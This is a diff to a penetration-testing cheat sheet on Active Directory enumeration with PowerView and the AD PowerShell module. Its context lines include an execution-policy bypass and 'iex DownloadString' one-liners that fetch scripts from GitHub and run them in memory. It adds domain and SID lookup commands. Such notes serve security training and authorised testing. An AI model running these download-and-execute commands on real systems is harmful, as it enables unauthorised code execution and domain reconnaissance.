@@ -11,7 +11,7 @@
 
 **Domain Enumeration with Powerview and AD PowerShell module**
 - To speed up things we can use Powerview:
-- `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+- `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`
 
 - The Active Directory PowerShell module
 - `https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps`
@@ -20,9 +20,21 @@
 
 **Run unrestricted commands with powershell**
 - `powershell -ep bypass`
-- Powerview Script Download
+- **Powerview Script Download**
 - `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`
-- ActiveDirectory Module Download
+- **ActiveDirectory Module Download**
 - `https://github.com/samratashok/ADModule` Download and Execute with `. .\Import-ActiveDirectory.ps1;Import-ActiveDirectory`
 -  or
 - `iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory `
+
+**Get Current Domain**
+- `Get-NetDomain` (Powerview)
+- `Get-ADDomain` (ActiveDirectory Module)
+
+**Get object of another domain**
+- `Get-NetDomain -Domain <domain-name>`
+- `Get-ADDomain -Identity <domain-name>`
+
+**Get Domain SID for the current domain**
+- `Get-DomainSID`
+- `(Get-ADDomain).DomainSID`
